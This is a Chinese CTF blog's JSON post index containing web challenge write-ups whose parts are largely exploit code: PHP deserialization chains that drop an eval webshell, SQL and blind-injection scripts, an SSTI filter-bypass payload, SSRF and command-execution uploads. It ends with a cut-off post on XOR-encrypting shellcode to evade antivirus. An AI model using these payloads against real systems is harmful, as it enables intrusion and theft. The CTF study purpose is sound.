{"pages":[{"title":"标签","text":"","link":"/tags/index.html"},{"title":"分类","text":"","link":"/categories/index.html"}],"posts":[{"title":"2020 新春红包题1","text":"[2020 新春红包题]1可以看到B类中有一个危险函数file_put_contents，只要能控制文件名和文件内容就可以写入webshell。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127&lt;?phperror_reporting(0);class A { protected $store; protected $key; protected $expire; public function __construct($store, $key = 'flysystem', $expire = null) { $this-&gt;key = $key; $this-&gt;store = $store; $this-&gt;expire = $expire; } public function cleanContents(array $contents) { $cachedProperties = array_flip([ 'path', 'dirname', 'basename', 'extension', 'filename', 'size', 'mimetype', 'visibility', 'timestamp', 'type', ]); foreach ($contents as $path =&gt; $object) { if (is_array($object)) { $contents[$path] = array_intersect_key($object, $cachedProperties); } } return $contents; } public function getForStorage() { $cleaned = $this-&gt;cleanContents($this-&gt;cache); return json_encode([$cleaned, $this-&gt;complete]); } public function save() { $contents = $this-&gt;getForStorage(); $this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire); } public function __destruct() { if (!$this-&gt;autosave) { $this-&gt;save(); } }}class B { protected function getExpireTime($expire): int { return (int) $expire; } public function getCacheKey(string $name): string { // 使缓存文件名随机 $cache_filename = $this-&gt;options['prefix'] . uniqid() . $name; if(substr($cache_filename, -strlen('.php')) === '.php') { die('?'); } return $cache_filename; } protected function serialize($data): string { if (is_numeric($data)) { return (string) $data; } $serialize = $this-&gt;options['serialize']; return $serialize($data); } public function set($name, $value, $expire = null): bool{ $this-&gt;writeTimes++; if (is_null($expire)) { $expire = $this-&gt;options['expire']; } $expire = $this-&gt;getExpireTime($expire); $filename = $this-&gt;getCacheKey($name); $dir = dirname($filename); if (!is_dir($dir)) { try { mkdir($dir, 0755, true); } catch (\\Exception $e) { // 创建失败 } } $data = $this-&gt;serialize($value); if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) { //数据压缩 $data = gzcompress($data, 3); } $data = &quot;&lt;?php\\n//&quot; . sprintf('%012d', $expire) . &quot;\\n exit();?&gt;\\n&quot; . $data; $result = file_put_contents($filename, $data); if ($result) { return $filename; } return null; }}if (isset($_GET['src'])){ highlight_file(__FILE__);}$dir = &quot;uploads/&quot;;if (!is_dir($dir)){ mkdir($dir);}unserialize($_GET[&quot;data&quot;]); 文件名A类的key属性作为参数传入set函数 key属性传入set方法后作为$name传入getCachekey方法，返回$filename后作为file_put_contents函数的文件名参数 B类的getCacheKey方法。文件名由$this-&gt;options['prefix'] . uniqid() . $name拼接而成，uniqid()为随机生成的一串数字，同时取最后四位看是否等于.php。只要利用linux目录解析特性传入/../shell.php/.这种形式即可绕过后缀名限制 文件内容1.A类的__destruct()方法触发save方法 2.A类的save方法调用set方法，令store属性等于B类触发set，写入的文件内容$content等于getForStorage方法返回值,we 3.A类的getForStorage方法， 4.A类的cleanContents方法，接收一个数组为参数，array_intersect_key取两个数组的子集，把它们的键值交换后返回，这里就要求cache必须为一个数组 5.B类的serialize方法，返回$serialize($dara)，可以使$this-&gt;options[‘serialize’]等于serialize 6.set方法中文件内容$data被拼接上了&lt;?php exit();。由于file_put_contents的第一个参数可以为php伪协议，这样我们就可以设置file_put_contents的第一个参数为php://fliter/write=convert.base64-decode，第二个参数为base64编码后的一句话，这样前面的拼接上的&lt;?php exit();就会被转换成乱码。 cache属性的处理过程，最终作为文件内容参数传入file_put_contents 1serialize(json_encode(cleanContents($this-&gt;cache))) 利用构造exp 1234567891011121314151617181920212223242526272829&lt;?phpclass A{ protected $store; protected $key; protected $expire; public $cache =[]; public $complete = true; public function __construct () { $this-&gt;store = new B(); $this-&gt;key = '/../1.php/.'; $this-&gt;cache = ['dirname'=&gt;'aPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+']; }}class B{ public $options = [ 'serialize' =&gt; 'serialize', 'prefix' =&gt; 'php://filter/write=convert.base64-decode/resource=./uploads/', ];}$a = new A();echo urlencode(serialize($a));?&gt; 成功写入文件 拿到flag","link":"/2021/03/30/2020-%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E9%A2%981/"},{"title":"2019强网杯web部分复现","text":"随便注堆叠注入 测试时发现过滤了一些函数 1preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); [ 查看数据库 11';show databases # [ 查看表名，发现两张表 1919810931114514 words 1?inject=1';show tables from supersqli # [ 表1919810931114514中存在flag字段 11';show columns from `1919810931114514`;# [ 使用handler绕过 1?inject=1';handler `1919810931114514` open;handler `1919810931114514` read first;handler `1919810931114514`close # [ upload反序列化 注册用户 [ 进入后发现可以上传图片 [ 下载备份文件www.tar.gz 在cookie处发现序列化后的字符串，推测是要利用反序列化。 [ 全局搜索unserialize，定位到/web/controller/Index.php,从cookie中获取basse64编码后的user值然后进行反序列化 [ /web/controller/Profile.php的Profile类中调用了copy函数，可以重命名文件。$this-&gt;filename_tmp和$this-&gt;filename均可控，可以结合上传图片功能，调用upload_img方法将上传后的图片文件命名为php文件，直接getshell。 [ /web/controller/Register.php中的Register类存在__destruct方法，只要把checker赋值为Profile类即可触发__call方法 [ Profile类中存在__call方法和__get方法，__call方法中存在调用函数的可能，函数名为$this-&gt;{$this-&gt;{$name}}，进入__call方法后$this-&gt;index访问不存在的属性，从而调用__get方法，我们可以在__get方法中把$this-&gt;index赋值为upload_img，这样__call中即可调用upload_img。except属性可控，令except属性等于 array(‘index’ =&gt; ‘upload_img’)，这样$this-&gt;{$this-&gt;{$name}}就会等于$this-&gt;index等于upload_img，从而能在__call方法中调用upload_img函数 [ 构造expRegister类中的__destruct()方法-&gt;Profile类中的__call()方法-&gt;Profile类中的__get()方法-&gt;Profile类中的upload_img()方法 123456789101112131415161718192021222324252627&lt;?phpnamespace app\\web\\controller;use think\\Controller;class Profile{ public $filename_tmp=&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/30a17ed2359586e474712c283fa27ffb.png&quot;; public $filename=&quot;./upload/a0e8e2b0d70d8e34d1bd3b1452e39848/111.php&quot;; public $except=array('index'=&gt;'upload_img'); public $ext=true;}class Register{ public $checker; public function __construct($p) { $this-&gt;checker=$p; }}$a=new Profile();$b=new Register($a);echo urlencode(base64_encode(serialize($b)));?&gt; 利用上传图片马 [ 在cookie的user参数中写入payload [ 改名成功 [ smarthacker脚本编写 直接下载备份文件开始分析 [ 打开后发现大量疑似webshell，但是大都无法利用，由于数量高达3000个，逐个分析是不可能的，因此只能利用python脚本构造请求测试webshell中的参数是否可用 [ 编写脚本测试 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import requestsimport osimport timeimport repatternget=re.compile(&quot;GET\\[\\'(.+?)\\'\\]&quot;)patternpost=re.compile(&quot;POST\\[\\'(.+?)\\'\\]&quot;)os.chdir('D:\\phpstudy_pro\\WWW\\ctf\\src')files=os.listdir('D:\\phpstudy_pro\\WWW\\ctf\\src')requests.adapters.DEFAULT_RETRIES = 5 session = requests.Session()session.keep_alive = Falsewebshellname=&quot;&quot;def get(): for filename in files: print(filename) index=11 with open(filename,'r') as f: result=patternget.findall(str(f.read())) print(result) for arg in result: index+=1 url='http://127.0.0.1/ctf/src/%s?%s=echo 955682789;' %(filename,arg) r=session.get(url) if '955682789' in r.text: print(&quot;webshell is %s:%s&quot; %(filename,arg)) webshellname=&quot;webshell is %s:%s&quot; %(filename,arg) break else: continue breakdef post(): for filename in files: print(filename) with open(filename,'r') as f: result=patternpost.findall(str(f.read())) print(result) for arg in result: url='http://127.0.0.1/ctf/src/%s' %filename data={arg:'echo 955682789;'} r=session.post(url=url,data=data) if '955682789' in r.text: print(&quot;webshell is %s:%s&quot; %(filename,arg)) webshellname=&quot;webshell is %s:%s&quot; %(filename,arg) break else: continue breakif __name__=='__main__': #post() get() 拿到flag [","link":"/2021/03/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"},{"title":"2021 DASCTF三月赛web总结","text":"BestDBunion注入 开始就提示了sql语句，单引号和空格被过滤，双引号闭合即可 1$sql = &quot;SELECT * FROM users WHERE id = '$query' OR username = \\&quot;$query\\&quot;&quot;; 读取表名 1http://183.129.189.60:10005/?query=asd&quot;/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),3%23 读取列名 1http://183.129.189.60:10005/?query=asd&quot;/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;f1agdas&quot;),3%23 读取f1agdas，得知flag在flag.txt 1http://183.129.189.60:10005/?query=asd%22/**/union/**/select/**/1,(select/**/group_concat(f1agdas)/**/from/**/f1agdas),3%23 使用load_File读取文件，flag.txt被过滤，改为hex编码即可绕过 1http://183.129.189.60:10005/?query=asd&quot;/**/union/**/select/**/1,(select/**/hex(load_file(0x2F666C61672E747874))),3%23 解码后得到flag，DASCTF{352f1504696639a0d71c2d36591d505b} baby_flaskssti，源码中给出了黑名单，可以使用join过滤器和unicode数字绕过 12345678910111213&lt;!--Hi young boy!&lt;/br&gt;Do you like ssti?&lt;/br&gt;blacklist&lt;/br&gt; '.','[','\\'','&quot;',''\\\\','+',':','_',&lt;/br&gt; 'chr','pop','class','base','mro','init','globals','get',&lt;/br&gt; 'eval','exec','os','popen','open','read',&lt;/br&gt; 'select','url_for','get_flashed_messages','config','request',&lt;/br&gt; 'count','length','０','１','２','３','４','５','６','７','８','９','0','1','2','3','4','5','6','7','8','9'&lt;/br&gt; &lt;/br&gt; --&gt; 123456789101112131415{%set a=dict(po=aa,p=aa)|join%} # pop{%set b=lipsum|string|list|attr(a)(𝟙𝟠)%} # _{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%} # globals{%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%} # getitem{%set e=dict(o=cc,s=aa)|join%} # os{%set f=lipsum|string|list|attr(a)(𝟡)%} # 空格{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%} # 斜杠{%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%} # cat /flag{%set h=(a,dict(en=aa)|join|join)|join%} # popen{%set i=dict(re=aa,ad=aa)|join%} # read{%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%} #点{%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%} #ls /var/www/flask{%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%}{{j}}#最后拼接起来#{{lipsum.__globals__['os'].popen('ls /var/www/flask').read()}} payload 1name={%set a=dict(po=aa,p=aa)|join%}{%set b=lipsum|string|list|attr(a)(𝟙𝟠)%}{%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%}{%set d=(b,b,dict(ge=cc,tit=dd,em=aa)|join,b,b)|join%}{%set e=dict(o=cc,s=aa)|join%}{%set f=lipsum|string|list|attr(a)(𝟡)%}{%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟠)%}{%set i=(dict(cat=aa)|join,f,g,dict(flag=aa)|join)|join%}{%set h=(a,dict(en=aa)|join|join)|join%}{%set i=dict(re=aa,ad=aa)|join%}{%set z=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-𝟝)%}{%set j=(dict(ls=aa)|join,f,g,(dict(var=aa)|join),g,(dict(www=aa)|join),g,(dict(flask=aa)|join)|join)|join%}{%print (((lipsum|attr(c))|attr(d)(e))|attr(h)(j))|attr(i)()%}{{j}} ez_loginindex.php，开始的session可以使用session.upload_progress绕过 https://www.freebuf.com/news/202819.html 123456789101112131415161718192021222324&lt;?php if(!isset($_SESSION)){ highlight_file(__FILE__); die(&quot;no session&quot;); } include(&quot;./php/check_ip.php&quot;); error_reporting(0); $url = $_GET['url']; if(check_inner_ip($url)){ if($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1); $output = curl_exec($ch); $result_info = curl_getinfo($ch); curl_close($ch); } }else{ echo &quot;Your IP is internal yoyoyo&quot;; } ?&gt; 发现目录下存在admin.php，必须要本地访问 构造ssrf请求admin.php 1234567891011121314# coding=utf-8import ioimport requestsimport threadingsessid = 'flag'url = &quot;http://183.129.189.60:10015/?url=http://localhost/admin.php&quot;f = io.BytesIO(b'a' * 1024 * 50)session = requests.session()resp = session.post(url,data={'PHP_SESSION_UPLOAD_PROGRESS': 'x'},files={'file': ('tgao.txt', f)}, cookies={'PHPSESSID': sessid})print(resp.text) 发现两个文件login_admin.php，/yuanma_f0r_eAZy_logon.zip 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt;&lt;title&gt;Admin Login&lt;/title&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;&lt;script type=&quot;application/x-javascript&quot;&gt; addEventListener(&quot;load&quot;, function() { setTimeout(hideURLbar, 0); }, false); function hideURLbar(){ window.scrollTo(0,1); } &lt;/script&gt;&lt;meta name=&quot;keywords&quot; content=&quot;Flat Dark Web Login Form Responsive Templates, Iphone Widget Template, Smartphone login forms,Login form, Widget Template, Responsive Templates, a Ipad 404 Templates, Flat Responsive Templates&quot; /&gt;&lt;link href=&quot;css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;&lt;!--/yuanma_f0r_eAZy_logon.zip--&gt;&lt;!--webfonts--&gt;&lt;link href=&quot;http://fonts.useso.com/css?family=PT+Sans:400,700,400italic,700italic|Oswald:400,300,700&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;link href=&quot;http://fonts.useso.com/css?family=Exo+2&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;&lt;!--//webfonts--&gt;&lt;script src=&quot;http://ajax.useso.com/ajax/libs/jquery/1.11.0/jquery.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;$(document).ready(function(c) { $(&quot;.close&quot;).on(&quot;click&quot;, function(c){ $(&quot;.login-form&quot;).fadeOut(&quot;slow&quot;, function(c){ $(&quot;.login-form&quot;).remove(); }); }); });&lt;/script&gt; &lt;!--SIGN UP--&gt; &lt;h1&gt;Login&lt;/h1&gt;&lt;div class=&quot;login-form&quot;&gt; &lt;div class=&quot;close&quot;&gt; &lt;/div&gt; &lt;div class=&quot;head-info&quot;&gt; &lt;label class=&quot;lbl-1&quot;&gt; &lt;/label&gt; &lt;label class=&quot;lbl-2&quot;&gt; &lt;/label&gt; &lt;label class=&quot;lbl-3&quot;&gt; &lt;/label&gt; &lt;/div&gt; &lt;div class=&quot;clear&quot;&gt; &lt;/div&gt; &lt;div class=&quot;avtar&quot;&gt; &lt;img src=&quot;images/avtar1.png&quot; /&gt; &lt;/div&gt; &lt;form action=&quot;./login_admin.php&quot;&gt; &lt;input type=&quot;text&quot; class=&quot;text&quot; name=&quot;username&quot; value=&quot;Username&quot; onfocus=&quot;this.value = &quot;&quot;;&quot; onblur=&quot;if (this.value == &quot;&quot;) {this.value = &quot;Username&quot;;}&quot; &gt; &lt;div class=&quot;key&quot;&gt; &lt;input type=&quot;password&quot; value=&quot;Password&quot; name=&quot;password&quot; onfocus=&quot;this.value = &quot;&quot;;&quot; onblur=&quot;if (this.value == &quot;&quot;) {this.value = &quot;Password&quot;;}&quot;&gt; &lt;/div&gt; &lt;/form&gt; &lt;div class=&quot;signin&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;Login&quot; &gt; &lt;/div&gt;&lt;/div&gt; &lt;div class=&quot;copy-rights&quot;&gt; &lt;p&gt;Copyright &amp;copy; ez login aha?&lt;/a&gt;&lt;/p&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;?&gt; yuanma_f0r_eAZy_logon.zip中包含一个se1f_Log3n.php se1lf_Log3n.php 1234567891011121314151617&lt;?phpinclude(&quot;./php/db.php&quot;);include(&quot;./php/check_ip.php&quot;);error_reporting(E_ALL);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;];if($ip !== &quot;127.0.0.1&quot;){ exit();}else{ try{ $sql = 'SELECT `username`,`password` FROM `user` WHERE `username`= &quot;'.$username.'&quot; and `password`=&quot;'.$password.'&quot;;'; $result = $con-&gt;query($sql); echo $sql; }catch(Exception $e){ echo $e-&gt;getMessage(); } ($result-&gt;num_rows &gt; 0 AND $row = $result-&gt;fetch_assoc() AND $con-&gt;close() AND die(&quot;error&quot;)) OR ( ($con-&gt;close() AND die('Try again!') )); } 存在布尔盲注，构造注入语句后用ssrf请求即可 1http://183.129.189.60:10015/?url=http://localhost//se1f_Log3n.php?username=admin'or 1=1%23password=admin 脚本 123456789101112131415161718from urllib.parse import quoteimport requestsimport timeasc_str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\&quot;#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~&quot;mydata = {'PHP_SESSION_UPLOAD_PROGRESS':'1'}myfile = {'file':('1.txt','1')}mycookie = {'PHPSESSID':'jtq4q3fdfgnckcrd52a6nhf90a'}ip = 'http://183.129.189.60:10015/?url='flag = ''ses=requests.session()payload = 'http://localhost//se1f_Log3n.php?username=admin\\'and 1=1%23password=admin'url = ip + quote(payload)r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie)print(r.text) and 1=1 and 1=2返回结果不同 盲注脚本 1234567891011121314151617181920212223from urllib.parse import quoteimport requestsimport timeasc_str = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\\&quot;#$%&amp;'()*+,-./:;&lt;=&gt;?@[\\]^_`{|}~&quot;mydata = {'PHP_SESSION_UPLOAD_PROGRESS':'mochu7'} myfile = {'file':('mochu7.txt','mochu7')}mycookie = {'PHPSESSID':'jtq4q3fdfgnckcrd52a6nhf90a'}ip = 'http://183.129.189.60:10015/?url='flag = ''ses=requests.session()for l in range(1,50): for s in asc_str: payload = 'http://localhost//se1f_Log3n.php?username=mochu\\'or ascii(mid((select flag from ctf.secret),{},1))={}%23password=mochu7'.format(l,ord(s)) url = ip + quote(payload) r = ses.post(url=url, data=mydata, files=myfile, cookies=mycookie) time.sleep(0.2) if 'correct?' in r.text: flag += s print(flag) else: pass 得到flag ez_serialize调用和SplFileObject内置类进行反序列化。FilesystemIterator用于遍历目录文件，SplFileObject用于读取文件 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;?phperror_reporting(0);highlight_file(__FILE__);class A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;B&quot;; $this-&gt;para = &quot;ctfer&quot;; echo new $this-&gt;class ($this-&gt;para); } public function __wakeup() { $this-&gt;check = new C; if($this-&gt;check-&gt;vaild($this-&gt;para) &amp;&amp; $this-&gt;check-&gt;vaild($this-&gt;class)) { echo new $this-&gt;class ($this-&gt;para); } else die('bad hacker~'); }}class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); }}class C{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }}if(isset($_GET['pop'])){ unserialize($_GET['pop']);}else{ $a=new A;} hello ctfer 列出目录下文件 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;FilesystemIterator&quot;; $this-&gt;para = &quot;/var/www/html/&quot;; //echo new $this-&gt;class ($this-&gt;para); }}class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); }}class C{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }}$a=new A();echo urlencode(serialize($a)); 发现目录aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE，目录下存在flag.php 1http://76863e29-3ca5-4471-ac1a-57b8f52336b7.machine.dasctf.com/?pop=O%3A1%3A%22A%22%3A3%3A{s%3A5%3A%22class%22%3Bs%3A18%3A%22FilesystemIterator%22%3Bs%3A4%3A%22para%22%3Bs%3A14%3A%22%2Fvar%2Fwww%2Fhtml%2F%22%3Bs%3A5%3A%22check%22%3BN%3B} 发现目录aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE，目录下存在flag.php 读取文件 1234567891011121314151617181920212223242526272829303132333435363738&lt;?phpclass A{ public $class; public $para; public $check; public function __construct() { $this-&gt;class = &quot;SplFileObject&quot;; $this-&gt;para = &quot;/var/www/html/aMaz1ng_y0u_c0Uld_f1nd_F1Ag_hErE/flag.php&quot;; //echo new $this-&gt;class ($this-&gt;para); }}class B{ var $a; public function __construct($a) { $this-&gt;a = $a; echo (&quot;hello &quot;.$this-&gt;a); }}class C{ function vaild($code){ $pattern = '/[!|@|#|$|%|^|&amp;|*|=|\\'|&quot;|:|;|?]/i'; if (preg_match($pattern, $code)){ return false; } else return true; }}$a=new A();echo urlencode(serialize($a)); 参考https://blog.csdn.net/mochu7777777/article/details/115276176 https://www.plasf.cn/articles/dasctf202103.html https://blog.csdn.net/rfrder/article/details/115272645 https://whoamianony.top/2021/03/29/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/MAR%20DASCTF%E6%98%8E%E5%BE%A1%E6%94%BB%E9%98%B2%E8%B5%9B/","link":"/2021/04/08/2021-DASCTF%E4%B8%89%E6%9C%88%E8%B5%9Bweb%E6%80%BB%E7%BB%93/"},{"title":"2021红明谷ctf web部分复现","text":"easytp报错得到thinkphp版本为3.2.3 存在备份文件www.zip 控制器中存在unserialize函数，需要利用反序列化漏洞 Thinkphp3.2.3反序列化漏洞（注入&amp;文件读取） https://mp.weixin.qq.com/s?__biz=MzU2NDc2NDYwMA==&amp;mid=2247484711&amp;idx=1&amp;sn=0dd0f72b376b4922e4ae5b8bd614ae89&amp;scene=21#wechat_redirect exp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;?phpnamespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true // 开启才能读取文件 ); protected $config = array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;mysql&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); }}namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-&gt;img = new Memcache(); } }}namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-&gt;handle = new Model(); } }}namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-&gt;db = new Mysql(); $this-&gt;options['where'] = ''; $this-&gt;pk = 'id'; $this-&gt;data[$this-&gt;pk] = array( &quot;table&quot; =&gt; &quot;mysql.user where 1=updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,32)),0)#&quot;, &quot;where&quot; =&gt; &quot;1=1&quot; ); } }}namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick()));} 利用后得到当前数据库为mysql，需要查询其他数据库 发现test数据库 查询表名，发现flag 1updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema='test'),1,32)),0)# 查询flag，由于updatexml只能读取32位，需要分两次读取 1updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),1,32)),0)# 读取后面的flag 1updatexml(1,concat(0x7e,substr((select group_concat(flag) from test.flag),32,32)),0)# 得到flag 1flag{7c85503e-ea45-4bfe-ac62-3f2a27998348} javaweb访问/login，发现Set-Cookie中存在remeberMe，判断是shiro框架 存在/json，但是需要登陆才能访问 利用Apache Shiro 身份验证绕过漏洞 CVE-2020-11989 https://www.cnblogs.com/backlion/p/14055275.html 输入/;/json，成功登陆，提示需要json字符串 测试发现可以反序列化 在vps中看到回显 jackson反序列化，利用工具 https://github.com/welk1n/JNDI-Injection-Exploit Spring利用链，直接利用工具即可 成功带出flag write_shell123456789101112131415161718192021222324252627282930313233343536 &lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input){ if(preg_match(&quot;/'| |_|php|;|~|\\\\^|\\\\+|eval|{|}/i&quot;,$input)){ // if(preg_match(&quot;/'| |_|=|php/&quot;,$input)){ die('hacker!!!'); }else{ return $input; }}function waf($input){ if(is_array($input)){ foreach($input as $key=&gt;$output){ $input[$key] = waf($output); } }else{ $input = check($input); }}$dir = 'sandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';if(!file_exists($dir)){ mkdir($dir);}switch($_GET[&quot;action&quot;] ?? &quot;&quot;) { case 'pwd': echo $dir; break; case 'upload': $data = $_GET[&quot;data&quot;] ?? &quot;&quot;; waf($data); file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);}?&gt; 反引号执行命令，空格被过滤，使用$IFS绕过，也可以用%09 1http://eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com/?action=upload&amp;data=&lt;?=`ls\\$IFS\\$9/`?&gt; 读取flag 1http://eci-2ze08g0rhfwaewll9qad.cloudeci1.ichunqiu.com/?action=upload&amp;data=&lt;?=`cat\\$IFS\\$9\\`echo\\$IFS\\$9LyF3aGF0eW91d2FudGdnZ2dnZ2c0MDEucGhw|base64\\$IFS\\$9-d\\``?&gt; happsql布尔盲注。可以使用regexp盲注和exp报错盲注，后面还需要用到无列名注入的知识。 regexp盲注，由于^被过滤，所以需要使用十六进制编码绕过，题目中过滤了information_schema，需要先读取mysql.innodb_table_stats来获得表名然后再进行无列名注入。 1234567891011121314151617181920212223242526272829303132import binasciiimport stringimport requestsresult = ''for j in range(50): for i in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}-,.&quot;: # for i in string.printable: url = &quot;http://eci-2ze6jljai3r428c1jf6q.cloudeci1.ichunqiu.com/login.php&quot; headers = { 'Content-Type': &quot;application/x-www-form-urlencoded&quot;, 'Referer': &quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com/index.php&quot;, 'Origin': &quot;http://eci-2zej5nwlszgd0g0na5qf.cloudeci1.ichunqiu.com&quot;, 'cache-control': &quot;no-cache&quot;, 'Postman-Token': &quot;21b59b79-a818-4fd1-a908-3112b45f9fc6&quot; } # 10. # response = requests.request(&quot;POST&quot;, url, data={ # 'username': 'admin&quot;||(select/**/version())/**/regexp/**/0x' + binascii.hexlify( # (&quot;^&quot; + result + i).encode()).decode() + '#', 'password': '123456'}, headers=headers) # ctf,f1ag, # response = requests.request(&quot;POST&quot;, url, data={ # 'username': 'admin&quot;||(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats)/**/regexp/**/0x' + binascii.hexlify( # (&quot;^&quot; + result + i).encode()).decode() + '#', # 'password': '123456'}, headers=headers) response = requests.request(&quot;POST&quot;, url, data={'username': 'admin&quot;||(select/**/*/**/from/**/f1ag)/**/regexp/**/0x' + binascii.hexlify((&quot;^&quot; + result + i).encode()).decode() + '#', 'password': '123456'}, headers=headers) print(response.text) if response.text.find(&quot;home&quot;) != -1: result += i print(result) breakprint(result) exp报错盲注脚本 123456789101112131415161718192021222324252627282930import osimport requestsimport stringurl = &quot;xxxxxxxx&quot;req = requests.session()string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789']res = ''chars = string.printableresult = &quot;&quot;for i in range(1,45): for j in chars: data = { # a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))# #'username':'a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/database()),%d)),%d),710,1))#'%(j,i,i), #数据库 # 'username':'a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/database_name/**/regexp/**/&quot;ctf&quot;),%d)),%d),710,1))#'%(j,i,i),#表 'username':'a&quot;||exp(make_set(strcmp((locate(binary&quot;%s&quot;,(select/**/group_concat(x.2)/**/from/**/(select/**/2/**/union/**/select/**/*/**/from/**/f1ag)x),%d)),%d),710,1))#'%(j,i,i), 'password':'213' } rep = req.post(url,data) text = rep.text if 'home.php' in text: result += j print(result) break 参考： http://www.yang99.top/index.php/archives/48/ https://www.zhaoj.in/read-6859.html https://mp.weixin.qq.com/s/E09ybDmvy-0gR44dT6_qmg","link":"/2021/04/16/2021%E7%BA%A2%E6%98%8E%E8%B0%B7ctf-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/"},{"title":"C编译xor加密shellcode免杀","text":"生成shellcodecs生成c格式shellcode 用010editor加密shellcodeCtrl+Shift+V将shellcode复制到010editor中，选择Tools-&gt;Hex Operation-&gt;Binary Xor，设置运算数为0x97,将shellcode与0x97异或后生成新的shellcode 